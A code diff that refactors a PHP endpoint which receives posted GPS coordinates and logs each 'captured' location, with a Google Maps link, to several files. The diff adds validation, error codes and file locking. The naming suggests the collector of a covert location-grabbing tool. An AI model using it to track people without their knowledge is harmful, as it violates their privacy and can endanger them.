@@ -1,68 +1,82 @@
 <?php
-$date = date('dMYHis');
-$latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
-$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
-$accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
 
-if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
-    // Create a marker file with minimal information
-    file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
-    
-    $data = "Latitude: " . $latitude . "\r\n" .
-            "Longitude: " . $longitude . "\r\n" .
-            "Accuracy: " . $accuracy . " meters\r\n" .
-            "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
-            "Date: " . $date . "\r\n";
-    
-    // Create a unique filename with timestamp
-    $file = 'location_' . $date . '.txt';
-    
-    try {
-        $fp = fopen($file, 'w');
-        if ($fp) {
-            fwrite($fp, $data);
-            fclose($fp);
-            $console_log = fopen("current_location.txt", "w");
-            fwrite($console_log, $data);
-            fclose($console_log);
-            
-            // Append to a master location file
-            $masterFile = 'saved.locations.txt';
-            
-            // Create the master file if it doesn't exist
-            if (!file_exists($masterFile)) {
-                touch($masterFile);
-                chmod($masterFile, 0666); 
-            }
-            
-            $fp = fopen($masterFile, 'a');
-            if ($fp) {
-                fwrite($fp, "\n=== New Location Captured ===\n" . $data . "\n");
-                fclose($fp);
-            }
-            
-            // Create saved_locations directory if it doesn't exist
-            if (!is_dir('saved_locations')) {
-                mkdir('saved_locations', 0755, true);
-            }
-            
-            // Copy the location file to the saved_locations directory
-            copy($file, 'saved_locations/' . $file);
-            
-            // Return success response
-            header('Content-Type: application/json');
-            echo json_encode(['status' => 'success', 'message' => 'Location data received']);
-        } else {
-            throw new Exception("Could not open file for writing");
-        }
-    } catch (Exception $e) {
-        header('Content-Type: application/json');
-        echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
-    }
-} else {
-    header('Content-Type: application/json');
-    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
+declare(strict_types=1);
+
+header('Content-Type: application/json');
+
+function respond(string $status, string $code, string $message, int $httpCode): void
+{
+    http_response_code($httpCode);
+    echo json_encode([
+        'status' => $status,
+        'code' => $code,
+        'message' => $message,
+    ]);
+    exit;
 }
 
-exit();
-?> 
+if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
+    respond('error', 'method_not_allowed', 'Only POST is allowed', 405);
+}
+
+$latRaw = $_POST['lat'] ?? null;
+$lonRaw = $_POST['lon'] ?? null;
+$accRaw = $_POST['acc'] ?? null;
+
+if ($latRaw === null || $lonRaw === null) {
+    respond('error', 'missing_fields', 'Location data missing or incomplete', 400);
+}
+
+$latitude = filter_var($latRaw, FILTER_VALIDATE_FLOAT);
+$longitude = filter_var($lonRaw, FILTER_VALIDATE_FLOAT);
+$accuracy = $accRaw !== null ? filter_var($accRaw, FILTER_VALIDATE_FLOAT) : false;
+
+if ($latitude === false || $longitude === false) {
+    respond('error', 'invalid_coordinates', 'Latitude/Longitude must be numeric', 422);
+}
+if ($latitude < -90 || $latitude > 90 || $longitude < -180 || $longitude > 180) {
+    respond('error', 'out_of_range', 'Latitude/Longitude out of range', 422);
+}
+if ($accuracy !== false && ($accuracy < 0 || $accuracy > 100000)) {
+    respond('error', 'invalid_accuracy', 'Accuracy value is not valid', 422);
+}
+
+$date = gmdate('Ymd_His');
+$accuracyText = $accuracy === false ? 'Unknown' : (string) $accuracy;
+$data = "Latitude: {$latitude}\r\n"
+    . "Longitude: {$longitude}\r\n"
+    . "Accuracy: {$accuracyText} meters\r\n"
+    . "Google Maps: https://www.google.com/maps/place/{$latitude},{$longitude}\r\n"
+    . "Date: {$date}\r\n";
+
+$locationFile = "location_{$date}.txt";
+file_put_contents('LocationLog.log', "Location captured\n", FILE_APPEND | LOCK_EX);
+
+if (file_put_contents($locationFile, $data, LOCK_EX) === false) {
+    respond('error', 'write_failed', 'Could not save location data', 500);
+}
+
+if (file_put_contents('current_location.txt', $data, LOCK_EX) === false) {
+    respond('error', 'write_failed', 'Could not save location snapshot', 500);
+}
+
+$masterFile = 'saved.locations.txt';
+if (!file_exists($masterFile)) {
+    touch($masterFile);
+    chmod($masterFile, 0640);
+}
+
+$masterRecord = "\n=== New Location Captured ===\n{$data}\n";
+if (file_put_contents($masterFile, $masterRecord, FILE_APPEND | LOCK_EX) === false) {
+    respond('error', 'write_failed', 'Could not save location history', 500);
+}
+
+if (!is_dir('saved_locations') && !mkdir('saved_locations', 0750, true) && !is_dir('saved_locations')) {
+    respond('error', 'mkdir_failed', 'Could not create saved_locations directory', 500);
+}
+
+if (!copy($locationFile, 'saved_locations/' . $locationFile)) {
+    respond('error', 'copy_failed', 'Could not copy location file', 500);
+}
+
+respond('success', 'ok', 'Location data received', 200);
